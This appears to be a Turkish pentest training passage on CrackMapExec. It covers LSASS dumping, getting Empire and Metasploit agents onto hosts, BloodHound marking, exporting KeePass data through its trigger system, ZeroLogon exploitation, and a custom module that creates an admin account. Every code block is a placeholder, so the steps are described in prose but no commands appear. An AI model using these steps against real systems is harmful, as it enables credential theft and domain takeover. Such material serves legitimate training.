* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'ını oluşturan esnek bir araçtır. **LSASS**'e bir **handle** açmak tespit edilebileceğinden, **Nanodump** mevcut **handle**'ları arayabilir. Eğer bir **handle** bulunursa, bunu kopyalayıp **minidump** oluşturmak için kullanır. Ancak, böyle bir **handle** bulunacağının garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bölgesi veya başka bir kaynak** ile etkileşime geçmesini sağlayan **benzersiz bir tanımlayıcıdır**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.

---


### Bir **C2 Framework** içinde **session**'ları alma.

CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir `agent` almak için CrackMapExec'i kullanabiliriz.

Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.


### Empire

Web sitelerinde sağlanan [kılavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'ü yükleyerek başlayacağız


### Empire Server'ı Kurun ve Başlatın

{{CODE_BLOCK_176}}

Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz `empireadmin` kullanıcı adını ve `asdasd123` şifresini kullanacağız! .


### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma

{{CODE_BLOCK_177}}

Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.

CrackMapExec yapılandırma dosyası varsayılan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seçeneğini `empireadmin` kullanıcı adı ve `asdasd123` şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server `1337` portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### İnceleme

{{CODE_BLOCK_179}}


Yapılandırma dosyaları değiştirildikten sonra, Empire client ile Empire sunucusuna bağlanmalıyız

{{CODE_BLOCK_180}}

Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

Artık listener'ımız çalışıyor ve `empire_exec` modülü ile Empire'a bir `agent` almak için CrackMapExec'i kullanabiliriz. Ayarladığımız listener olan `LISTENER=http` seçeneğini eklememiz gerekiyor.


### CrackMapExec Modülünü Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

Aynı şeyi CrackMapExec modülü `web_delivery` kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve `web_delivery` handler'ını yapılandıralım


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. `URL` ve `PAYLOAD` olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer `x64` kullanıyorsak, `x64` varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. Eğer `32 bit` payload kullanıyorsak `PAYLOAD=32` seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum görmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

Başka bir C2 Framework kullanmak istediğimizde, **Command Execution** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **`--no-output`** seçeneğini seçmemiz gerekecektir.

Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. 


### **BloodHound**'da **Owned** olarak işaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için node'a sağ tıklayıp **`Mark X as Owned`** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **`Shortest Path from Owned Principals`** (Ele Geçirilmiş Principal'dan En Kısa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele Geçirilmiş Principal'dan Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.

CrackMapExec'i, ele geçirdiğimiz herhangi bir user veya computer'ı BloodHound veritabanında `owned` olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:

* Bloodhound yapılandırma seçeneği `bh_enabled`'ı `True` olarak ayarlayın.
* `bh_uri`'yi Bloodhound veritabanı `IP` adresimize ayarlayın.
* `bh_port`'u veritabanı `portuna` ayarlayın
* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı `neo4j` ve şifre `asdasd123` (Veritabanınıza karşılık geleni kullandığınızdan emin olun).

Yapılandırma aşağıdaki gibi görünmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.

### Bloodhound Verilerinin Toplanması

BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.

### BloodHound verilerinin toplanması

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.


### BloodHound'da Kullanıcıları Owned Olarak Ayarlama

Veriler içe aktarıldıktan sonra, `robert` kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.

### Kullanıcı BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.

### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, `--ntds` veya `--lsa` seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak `procdump` veya `lsassy` gibi modüller kullanıcıları sahip olunan olarak işaretler.


### BloodHound'da Bilgisayarları Owned Olarak Ayarlama

Yazım sırasında, BloodHound entegrasyonu yalnızca user'ları Owned olarak işaretlemektedir. Bir `computer` owned olarak işaretlemek istiyorsak, `bh_owned` modülünü ve `neo4j` veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca `PASS` seçeneğini ekleyeceğiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.


### LDAP Protocol Modules

LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.


### **LDAP Module - get-network**

`get-network` modülü [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'ı  temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, `zone transferine` benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, internal ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.

Modülü kullanmanın üç (3) yolu vardır:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adları).

Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. `ALL=true` seçeneğini seçersek, hem IP hem de domain adlarını alır ve `ONLY_HOSTS=true` olarak belirtirsek, yalnızca FQDN'yi alırız.


### DNS Sunucusundan (Record) Kayıtları Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazının yazıldığı zamanda, modül **`adidnsdump`** aracıyla bazı farklılıklar göstermektedir. Sonuçlar, hesaplar arasında farklılık gösterebilir.


### LDAP Module - laps

Bir başka harika modül de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya `parola sıfırlama` talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için `COMPUTER` seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir wildcard karakterle birlikte kullanabiliriz.


### LAPS Modülü Parolaların Alınması

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır

### LDAP Modülü - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'ü ile temsil edilen ve varsayılan olarak bir **user**'ın bir **domain** içinde oluşturabileceği **computer account** sayısını belirten bir **domain level attribute**'tür.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazı **attack** senaryolarında **domain** içinde bir **machine** oluşturmak gerekebilir, bu yüzden **account machine quota attribute**'ünü **enumerate** etmek önemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir başka harika modül ise bir veya birden fazla object'in `DACL`'lerini okumamızı ve dışa aktarmamızı sağlayan `daclread`'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabının tüm **ACE**'lerini okumak istiyoruz. Bunun için **`TARGET`** seçeneğini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace Kullanıcısının DACL'sini Oku

{{CODE_BLOCK_203}}


Ayrıca belirli hakları da arayabiliriz, örneğin hangi **principal**'ların **DCSync** haklarına sahip olduğunu. Bunun için **`TARGET_DN`** seçeneğini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seçeneğini seçmemiz ve aramak istediğimiz hakları **`RIGHTS`** seçeneğiyle belirlememiz gerekir.

### DCSync Rights'a Sahip Kullanıcıları Arama

{{CODE_BLOCK_204}}



Çıktıda gösterildiği gibi, `ACE[4]` `robert` kullanıcısının hedef domain'de `DCSync` haklarına sahip olduğunu gösterir.

LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.

Not: SMB kullanan modüllerin çoğunun çalışması için admin haklarına ( `Pwned!` ) ihtiyaç vardır.


### SMB Modülleri - get_netconnections ve ioxidresolver

Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. `get_netconnections` ve `ioxidresolver` modüllerini kullanalım ve farklarını görelim.

`get_netconnections` modülü, ağ bağlantılarını sorgulamak için `WMI` kullanır. `IPv6` ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.


### get_netconnections Module

{{CODE_BLOCK_206}}


Öte yandan, `ioxidresolver` modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül `IPv6` adreslerini içermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal ağlarda adminler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir password manager'dır. Bir master password onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.

### KeePass'i Keşfetme

{{CODE_BLOCK_208}}

Eğer master parolaya sahip değilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın triger sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.

Bunu kullanmak için beş (5) adıma ihtiyacımız var:

*  KeePass yapılandırma dosyasını bulun. Biz bunu `keepass_discover` modülü ile yaptık.
 * `ACTION=ADD` seçeneğini ve `KEEPASS_CONFIG_PATH` öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.

### KeePass Yapılandırma Dosyasına Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapılandırma yolu için ters eğik çizgi (`/`) veya çift eğik çizgi (`\`) kullandığınızdan emin olun.

* Kullanıcının KeePass'i açmasını ve master parolayı girmesini bekleyin. Bu işlemi zorlamak için `ACTION=RESTART` seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, `USER=julio` gibi kullanıcı adı ile `USER` seçeneğini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seçeneğini kullanarak export edilen veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.


### Ele Geçirilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seçeneğini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapılandırma dosyasını temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modülün her seçeneğini öğrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seçeneğin iyi yanı, **extract_password** yöntemini de içermesidir; bu yöntem **.xml** dosyasında herhangi bir parola girişini arar ve konsola yazdırır.


### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma

{{CODE_BLOCK_214}}

Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre `/tmp/export.xml` dosyasında olacaktır, böylece manuel olarak alabiliriz.

### RDP'yi Etkinleştirme veya Devre Dışı Bırakma

Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü lateral hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.

Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. `ACTION` seçeneğini ve ardından `enable` veya `disable` seçeneklerini belirtmemiz gerekir.


### RDP'yi Etkinleştirme

{{CODE_BLOCK_215}}


SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız

### Vulnerability Scan Modules

Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.

CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geçirdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi `172.16.10.3`'tür.

Domain'e erişim sağlamak için, CME ile ProxyChain bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız


### Chisel'i Hedef Makineye Gönderme

{{CODE_BLOCK_217}}


### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma

{{CODE_BLOCK_218}}


### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.


### ZeroLogon

Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in controller'ı ele geçirmek için savunmasız bir Netlogon session'ı başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.

CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.


### ZeroLogon Güvenlik Açığı Kontrolü

{{CODE_BLOCK_220}}


### PetitPotam

Güvenlik araştırmacısı [Gilles Lionel](https://twitter.com/topotam77) kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu servisine (örneğin bir Domain Controller) yönelik klasik bir `NTLM relay` saldırısıdır. Lionel ayrıca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir proof of  concept kodu da yayınladı.

CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan `petitpotam` adlı bir modül içerir.


### Petitpotam Güvenlik Açığı Kontrolü

{{CODE_BLOCK_221}}


### noPAC

noPAC güvenlik açığının exploit'i, normal bir domain kullanıcısının ayrıcalıklarının bir domain admin yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.

CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin controller'ı ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.

Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü `dfscoerce`'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için `Y3t4n0th3rP4ssw0rd` şifresiyle `carole.holmes` hesabını kullanacağız.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.

CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( `logging.debug` ) ile bazı debug log'ları eklediğini göreceğiz. CrackMapExec'i hata debug modunda çalıştırırsak, bu logları yazdıracaktır.

CrackMapExec'i debug modunda çalıştırmak için protokolden önce `--verbose` seçeneğini kullanabiliriz


### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma

{{CODE_BLOCK_225}}


`DEBUG` ile başlayan satırlar `logging.debug`'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB servisindeki kritik bir kimliği doğrulanmamış remote kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### Güvenlik Açığından Yararlanma

Birçok güvenlik açığı gördük. Onlardan birini exploit etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.

---

### Kendi CME Modülümüzü Oluşturmak

Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.


### CrackMapExec'i Poetry ile derleyin

Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın

Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un Kurulması ve Çalıştırılması

{{CODE_BLOCK_229}}

Daha sonra açmak için `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni Modülümüzü Oluşturun

Modülümüzü oluşturalım. Yeni bir administrator hesabı oluşturacak basit bir script oluşturacağız.

* ./CrackMapExec/cme/modules klasörü altında `createadmin.py` adında bir dosya oluşturun.
* Aşağıdaki kod örneğini dosyaya kopyalayın:

{{CODE_BLOCK_231}}



* Şimdi modülümüzü özelleştirelim.

Bazı değişkenleri tanımlamamız gerekiyor:

* `name`, modül adını nasıl çağıracağımızı belirtir. Bu durumda, `createadmin` dosya adını kullanacağız.
* `description` modülün amacı için kısa bir açıklamadır. Biz bunu `Create a new administrator account` ayarlayacağız.
* `supported_protocols`, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece `SMB` kullanacağız.
* `opsec_safe`, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir `True` veya `False` değeridir.
* `multiple_hosts`, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.

Ayrıca, modül için değişkenleri tanımlamak için kullanılan `options()` methoduna da sahip olacağız. Bu durumda, `USER` ve `PASS` olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri `asdasd123` . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak `context.log.info` ve `context.log.highlight` metotlarını kullanacağız (farklı renklere sahipler).

Bu execute için, yöntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için `net user username password /add /Y` değeriyle ve kullanıcıyı administrators grubuna eklemek için `net localgroup administrators username /add` değeriyle command değişkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modülümüz şu şekilde görünmelidir:

{{CODE_BLOCK_234}}


### Modülümüzü Çalıştırma

Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.


### CME Modülümüzün Çalıştırılması createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.

{{CODE_BLOCK_236}}


İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.

Ayrıca `context.log.highlight(p)`'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?

### Diğer Yazarlardan Öğrenmek

